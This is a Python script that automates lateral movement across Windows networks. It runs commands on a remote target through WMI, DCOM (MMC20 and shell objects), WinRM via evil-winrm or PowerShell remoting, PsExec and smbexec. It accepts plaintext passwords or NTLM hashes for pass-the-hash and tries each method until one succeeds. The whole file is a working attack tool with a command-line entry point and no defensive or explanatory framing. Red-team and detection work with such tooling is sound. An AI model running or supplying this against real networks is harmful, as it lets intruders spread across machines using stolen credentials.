import os
import sys
import json
import socket
import struct
import subprocess
import time
import hashlib

def wmi_exec(target, username, password_or_hash, command='whoami', domain='', use_hash=False):
    """Execute commands via WMI (Windows Management Instrumentation).
    Uses impacket wmiexec.py or native wmic on Windows.
    WMI operates over DCOM (port 135 + dynamic high ports).
    """
    results = {'target': target, 'method': 'wmi', 'command': command}

    if use_hash:
        user_spec = f'{domain}/{username}' if domain else username
        cmd = ['wmiexec.py', '-hashes', password_or_hash, f'{user_spec}@{target}', command]
    else:
        user_spec = f'{domain}/{username}' if domain else username
        cmd = ['wmiexec.py', f'{user_spec}:{password_or_hash}@{target}', command]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        results['success'] = proc.returncode == 0
        results['output'] = proc.stdout[:2000]
        results['stderr'] = proc.stderr[:500]
    except FileNotFoundError:
        # Fallback: native wmic on Windows
        if os.name == 'nt':
            try:
                wmic_cmd = f'wmic /node:"{target}" /user:"{username}" /password:"{password_or_hash}" process call create "{command}"'
                proc = subprocess.run(wmic_cmd, shell=True, capture_output=True, text=True, timeout=30)
                results['success'] = proc.returncode == 0
                results['output'] = proc.stdout[:2000]
                results['method'] = 'wmic_native'
            except Exception as e:
                results['error'] = str(e)[:200]
        else:
            results['error'] = 'impacket wmiexec.py not found'
    except subprocess.TimeoutExpired:
        results['error'] = 'timeout'
    return results

def dcom_exec(target, username, password_or_hash, command='whoami', domain='', use_hash=False, dcom_object='MMC20'):
    """Execute commands via DCOM objects.
    Supported objects: MMC20 (MMC20.Application), ShellWindows, ShellBrowserWindow.
    Uses impacket dcomexec.py. DCOM uses port 135 + dynamic high ports.
    """
    results = {'target': target, 'method': f'dcom_{dcom_object}', 'command': command}
    user_spec = f'{domain}/{username}' if domain else username

    if use_hash:
        cmd = ['dcomexec.py', '-hashes', password_or_hash, '-object', dcom_object,
               f'{user_spec}@{target}', command]
    else:
        cmd = ['dcomexec.py', '-object', dcom_object,
               f'{user_spec}:{password_or_hash}@{target}', command]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        results['success'] = proc.returncode == 0
        results['output'] = proc.stdout[:2000]
    except FileNotFoundError:
        results['error'] = 'impacket dcomexec.py not found'
    except subprocess.TimeoutExpired:
        results['error'] = 'timeout'
    return results

def winrm_exec(target, username, password_or_hash, command='whoami', domain='', use_hash=False):
    """Execute commands via WinRM (port 5985/5986).
    Uses evil-winrm or impacket wmiexec with WinRM.
    """
    results = {'target': target, 'method': 'winrm', 'command': command}

    if use_hash:
        # evil-winrm with hash
        cmd = ['evil-winrm', '-i', target, '-u', username, '-H', password_or_hash.split(':')[-1]]
        if domain:
            cmd.extend(['-r', domain])
    else:
        cmd = ['evil-winrm', '-i', target, '-u', username, '-p', password_or_hash]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15, input=f'{command}\nexit\n')
        results['success'] = 'Evil-WinRM' in proc.stdout or proc.returncode == 0
        results['output'] = proc.stdout[:2000]
    except FileNotFoundError:
        # Fallback: PowerShell remoting on Windows
        if os.name == 'nt':
            try:
                ps_cmd = f'Invoke-Command -ComputerName {target} -Credential (New-Object PSCredential("{username}", (ConvertTo-SecureString "{password_or_hash}" -AsPlainText -Force))) -ScriptBlock {{{command}}}'
                proc = subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True, text=True, timeout=30)
                results['success'] = proc.returncode == 0
                results['output'] = proc.stdout[:2000]
                results['method'] = 'ps_remoting'
            except Exception as e:
                results['error'] = str(e)[:200]
        else:
            results['error'] = 'evil-winrm not found'
    except subprocess.TimeoutExpired:
        results['error'] = 'timeout'
    return results

def psexec_exec(target, username, password_or_hash, command='cmd.exe /c whoami', domain='', use_hash=False):
    """Execute commands via PsExec (SMB admin shares + named pipes).
    Creates a service on the target, runs command, removes service.
    Uses impacket psexec.py or Sysinternals PsExec.
    """
    results = {'target': target, 'method': 'psexec', 'command': command}
    user_spec = f'{domain}/{username}' if domain else username

    if use_hash:
        cmd = ['psexec.py', '-hashes', password_or_hash, f'{user_spec}@{target}', command]
    else:
        cmd = ['psexec.py', f'{user_spec}:{password_or_hash}@{target}', command]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        results['success'] = proc.returncode == 0
        results['output'] = proc.stdout[:2000]
    except FileNotFoundError:
        # Sysinternals PsExec on Windows
        if os.name == 'nt':
            try:
                cmd = ['PsExec.exe', f'\\\\{target}', '-u', f'{domain}\\{username}' if domain else username,
                       '-p', password_or_hash, '-accepteula', command]
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                results['success'] = proc.returncode == 0
                results['output'] = proc.stdout[:2000]
                results['method'] = 'sysinternals_psexec'
            except Exception as e:
                results['error'] = str(e)[:200]
        else:
            results['error'] = 'impacket psexec.py not found'
    except subprocess.TimeoutExpired:
        results['error'] = 'timeout'
    return results

def smb_named_pipe_exec(target, username, password_or_hash, command='whoami', domain='', use_hash=False):
    """Execute via SMB named pipes using smbexec (impacket).
    Creates a batch file on ADMIN$ share, executes via service, captures output.
    """
    results = {'target': target, 'method': 'smbexec', 'command': command}
    user_spec = f'{domain}/{username}' if domain else username

    if use_hash:
        cmd = ['smbexec.py', '-hashes', password_or_hash, f'{user_spec}@{target}']
    else:
        cmd = ['smbexec.py', f'{user_spec}:{password_or_hash}@{target}']

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15, input=f'{command}\nexit\n')
        results['success'] = proc.returncode == 0
        results['output'] = proc.stdout[:2000]
    except FileNotFoundError:
        results['error'] = 'impacket smbexec.py not found'
    except subprocess.TimeoutExpired:
        results['error'] = 'timeout'
    return results

def lateral_movement_auto(target, username, password_or_hash, domain='', use_hash=False):
    """Try all lateral movement methods in priority order."""
    results = {'target': target, 'attempts': []}
    methods = [
        ('psexec', psexec_exec),
        ('wmi', wmi_exec),
        ('winrm', winrm_exec),
        ('dcom_MMC20', lambda t,u,p,d=domain,h=use_hash: dcom_exec(t,u,p,domain=d,use_hash=h)),
        ('smbexec', smb_named_pipe_exec),
    ]
    for name, func in methods:
        attempt = func(target, username, password_or_hash, domain=domain, use_hash=use_hash)
        results['attempts'].append(attempt)
        if attempt.get('success'):
            results['success'] = True
            results['successful_method'] = name
            break
    else:
        results['success'] = False
    return results

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: script.py <target> <user> <pass_or_hash> [domain] [--hash]')
        sys.exit(1)
    target = sys.argv[1]
    user = sys.argv[2]
    secret = sys.argv[3]
    domain = sys.argv[4] if len(sys.argv) > 4 and not sys.argv[4].startswith('-') else ''
    use_hash = '--hash' in sys.argv
    out = lateral_movement_auto(target, user, secret, domain, use_hash)
    print(json.dumps(out, indent=2, default=str))

